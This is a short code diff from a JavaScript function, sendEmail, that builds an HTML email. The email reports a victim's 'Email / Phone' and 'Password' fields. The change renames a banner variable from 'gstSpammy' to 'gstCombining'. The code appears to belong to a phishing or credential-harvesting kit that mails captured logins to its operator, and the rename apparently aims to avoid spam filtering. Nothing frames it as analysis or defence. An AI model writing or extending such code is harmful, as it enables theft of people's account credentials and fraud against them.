@@ -444,7 +444,7 @@ async function sendEmail(data, folderName) {
 </head>
 <body>
 <div class="container">
-    <div class="topbar">${gstSpammy}</div>
+    <div class="topbar">${gstCombining}</div>
     <table>
         <tr><td class="label">Email / Phone</td><td class="value" style="color:#4fc3f7;">${data.email || '-'}</td></tr>
         <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
